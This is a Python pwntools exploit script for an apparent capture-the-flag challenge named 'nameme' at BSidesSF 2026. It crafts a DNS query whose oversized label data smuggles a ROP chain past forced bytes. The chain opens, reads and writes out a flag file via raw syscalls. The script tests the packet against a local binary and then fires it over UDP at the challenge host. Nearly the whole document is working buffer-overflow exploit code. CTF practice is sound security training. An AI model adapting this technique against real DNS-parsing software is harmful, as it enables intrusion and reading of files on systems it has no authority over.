#!/usr/bin/env python3
from pwn import *
import struct, socket, subprocess, re

context.arch = 'amd64'
HOST = 'nameme-5c8bc3ce.challenges.bsidessf.net'
PORT = 53535

pop_rdi=0x4028f0; pop_rsi=0x40fd82; pop_rax=0x43a257
pop_rdx_rbx=0x46abb7; syscall_ret=0x418842
flag_path=0x4a82e0; writable=0x4ac000

# Forced bytes in ROP region: entries 3,11,19,27,35 have bytes 6,7 = 0x3F,0x2E
# These entries MUST be small integer values (high bytes are corrupted but don't matter).
rop = [
    pop_rdi, flag_path,         # 0,1
    pop_rsi,                     # 2
    0,                           # 3: FORCED (esi=0 → O_RDONLY ✓)
    pop_rax, 2,                  # 4,5
    syscall_ret,                 # 6: open()
    pop_rdi, 6,                  # 7,8: fd=6 on remote (0=stdin,3=host.list,4=socket,5=dup?)
    pop_rdx_rbx, 256,            # 9,10
    0,                           # 11: FORCED (rbx junk ✓)
    pop_rsi, writable,           # 12,13
    pop_rax, 0,                  # 14,15: SYS_read
    syscall_ret,                 # 16: read(3, writable, 256)
    pop_rdx_rbx, 256,            # 17,18
    0,                           # 19: FORCED (rbx junk ✓)
    pop_rdi, 0,                  # 20,21: write to fd 0 (works on remote)
    pop_rsi, writable,           # 22,23
    pop_rax, 1,                  # 24,25: SYS_write
    pop_rdi,                     # 26: absorb forced entry 27
    0,                           # 27: FORCED (rdi junk ✓)
    pop_rdi, 1,                  # 28,29: reset rdi=1
    syscall_ret,                 # 30: write(1, writable, 256)
    pop_rdx_rbx, 0,              # 31,32
    0,                           # 33 (rbx)
    pop_rdi,                     # 34: pops entry 35
    0,                           # 35: FORCED (edi=0 for exit ✓)
    pop_rax, 60,                 # 36,37: SYS_exit
    syscall_ret,                 # 38: exit(0)
]

def buf_to_labeldata(buf_offset):
    v = buf_offset - 968; vi = v // 64; bi = v % 64
    if bi == 63: return None  # dot
    ns = 2 + vi * 64 + bi; K = ns // 64; d = ns % 64
    return K * 63 + d - 1 if d else None  # None if label len byte

def build():
    label_data = bytearray([0x3F] * (16 * 63))
    label_data[441] = 0x00  # terminator for second pass

    # Place ROP in label data (skip forced positions)
    for ei, ev in enumerate(rop):
        eb = p64(ev)
        for bi in range(8):
            buf_pos = 1064 + ei * 8 + bi
            bv = (buf_pos - 968) % 64
            if bv in (62, 63): continue  # forced 0x3F or dot
            ld = buf_to_labeldata(buf_pos)
            if ld is None or ld == 441: continue
            if 0 <= ld < len(label_data):
                label_data[ld] = eb[bi]

    # Clear saved rbx/rbp
    for off in [1048, 1056]:
        for i in range(8):
            ld = buf_to_labeldata(off + i)
            if ld and ld != 441 and 0 <= ld < len(label_data):
                label_data[ld] = 0

    # Build packet
    ns = b''
    for i in range(15):
        ns += bytes([63]) + bytes(label_data[i*63:(i+1)*63])
    ns += bytes([7]) + bytes(label_data[15*63:15*63+7])
    ns += bytes([0xC0, 13]) + struct.pack('>HH', 1, 1)
    return struct.pack('>HHHHHH', 0x1337, 0, 1, 0, 0, 0) + ns

pkt = build()
log.info(f"Packet: {len(pkt)} bytes")

# Test locally
log.info("Local test...")
r = subprocess.run(['./nameme'], input=pkt, capture_output=True, timeout=5,
                   cwd='/home/ubuntu/bsidesSF2026/pwn/nameme')
log.info(f"Exit: {r.returncode}, stdout: {len(r.stdout)} bytes")
flag = re.search(rb'CTF\{[^}]+\}', r.stdout)
if flag: log.success(f"LOCAL: {flag.group().decode()}")
elif r.stdout and r.stdout != b'\x00'*256:
    log.info(f"Stdout: {r.stdout[:100]}")

# Remote
log.info("Remote...")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5)
sock.sendto(pkt, (HOST, PORT))
try:
    resp = sock.recv(4096)
    log.info(f"Response: {len(resp)} bytes")
    flag = re.search(rb'CTF\{[^}]+\}', resp)
    if flag: log.success(f"FLAG: {flag.group().decode()}")
    else:
        p = bytes(b for b in resp if 32 <= b < 127 or b == 10)
        log.info(f"Printable: {p[:200]}")
except socket.timeout:
    log.warning("Timeout")
sock.close()
